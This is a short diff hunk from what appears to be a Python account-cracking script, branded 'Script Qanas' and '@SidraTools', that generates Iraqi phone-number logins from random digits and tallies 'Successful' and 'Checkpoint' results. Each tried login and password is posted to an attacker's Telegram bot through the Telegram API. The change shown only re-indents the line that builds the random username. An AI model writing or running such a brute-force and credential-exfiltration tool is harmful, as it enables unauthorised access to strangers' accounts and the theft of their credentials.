@@ -147,7 +147,7 @@ def main():
         else:
             Sk += 1
             r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @SidraTools")
-                    user = str(''.join((random.choice(new) for i in range(7))))
+        user = str(''.join((random.choice(new) for i in range(7))))
         q = '+964'
         x = '771'
         Email = q + x + user
